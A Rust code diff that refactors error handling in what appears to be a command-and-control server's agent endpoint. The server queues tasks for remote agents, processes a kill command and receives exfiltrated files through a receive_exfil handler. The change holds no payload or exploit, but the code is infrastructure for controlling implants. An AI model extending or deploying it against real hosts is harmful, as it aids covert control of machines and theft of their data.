@@ -73,16 +73,20 @@ pub async fn agent_post_handler(
         Err(_) => return StatusCode::BAD_REQUEST.into_response(),
     };
 
-    handle_agent_post_standard(state, headers, json)
-        .await
-        .into_response()
+    match handle_agent_post_standard(state, headers, json).await {
+        Ok(r) => r.into_response(),
+        Err(e) => {
+            log_error_async(&e).await;
+            return StatusCode::BAD_GATEWAY.into_response();
+        }
+    }
 }
 
 async fn handle_agent_post_standard(
     state: State<Arc<AppState>>,
     headers: HeaderMap,
     Json(payload): Json<Vec<Vec<u8>>>,
-) -> Vec<u8> {
+) -> Result<Vec<u8>, String> {
     let cl = state.clone();
 
     // We check the payload length later in an assert to make sure there is no incorrect state going on.
@@ -114,7 +118,11 @@ async fn handle_agent_post_standard(
             // But.. this should never appear.
             assert!(payload_len == 1);
 
-            let first_run_data: FirstRunData = match serde_json::from_str(&task.metadata.unwrap()) {
+            let Some(metadata) = task.metadata else {
+                return Err("Task metadata was None".to_string());
+            };
+
+            let first_run_data: FirstRunData = match serde_json::from_str(&metadata) {
                 Ok(d) => d,
                 Err(e) => panic!("Failed to deserialise first run data from string. {e}"),
             };
@@ -123,14 +131,14 @@ async fn handle_agent_post_standard(
             let (agent, tasks) = state
                 .connected_agents
                 .get_agent_and_tasks_by_header(&headers, &cl.db_pool, Some(first_run_data))
-                .await;
+                .await?;
 
             let mut init_tasks = agent.get_config_data();
             if let Some(mut tasks) = tasks {
                 init_tasks.append(&mut tasks);
             }
 
-            return serialise_tasks_for_agent(Some(init_tasks)).await;
+            return Ok(serialise_tasks_for_agent(Some(init_tasks)).await);
         }
 
         // Handle file exfil - save to disk and remove the exfil bytes, we dont want to store those
@@ -142,12 +150,12 @@ async fn handle_agent_post_standard(
         // If we have console messages, we need to explicitly put these in as a new task; although it isn't
         // a task strictly speaking, not doing so breaks the current model
         if task.command == Command::ConsoleMessages {
-            let uid = extract_agent_id(&headers);
+            let uid = extract_agent_id(&headers)?;
             let id = state
                 .db_pool
                 .add_task_for_agent_by_id(&uid, Command::ConsoleMessages, None)
                 .await
-                .expect("Could not insert new task for incoming Console Messages");
+                .map_err(|e| format!("Failed to add task for agent by ID: {uid} {e}"))?;
 
             // Overwrite the task ID from 1 to the new one
             task.id = id;
@@ -168,7 +176,7 @@ async fn handle_agent_post_standard(
         }
 
         // Get a copy of the agent
-        let agent_id = extract_agent_id(&headers);
+        let agent_id = extract_agent_id(&headers)?;
         if let Err(e) = state.db_pool.add_completed_task(&task, &agent_id).await {
             log_error_async(&format!(
                 "Failed to add task results to completed table where task ID = {}. {e}",
@@ -184,7 +192,7 @@ async fn handle_agent_post_standard(
     let (agent, tasks) = state
         .connected_agents
         .get_agent_and_tasks_by_header(&headers, &cl.db_pool, None)
-        .await;
+        .await?;
 
     //
     // Check whether the kill command is present and the agent needs removing from the live list..
@@ -194,14 +202,14 @@ async fn handle_agent_post_standard(
     //
     // Serialise the response and return it
     //
-    serialise_tasks_for_agent(tasks).await
+    Ok(serialise_tasks_for_agent(tasks).await)
 }
 
 async fn receive_exfil(mut mp: Multipart) -> Result<StatusCode, StatusCode> {
     let mut hostname: Option<String> = None;
     let mut source_path: Option<String> = None;
 
-    while let Some(mut field) = mp.next_field().await.map_err(|_| StatusCode::BAD_REQUEST)? {
+    while let Some(field) = mp.next_field().await.map_err(|_| StatusCode::BAD_REQUEST)? {
         match field.name() {
             Some("hostname") => {
                 hostname = Some(field.text().await.map_err(|_| StatusCode::BAD_REQUEST)?)
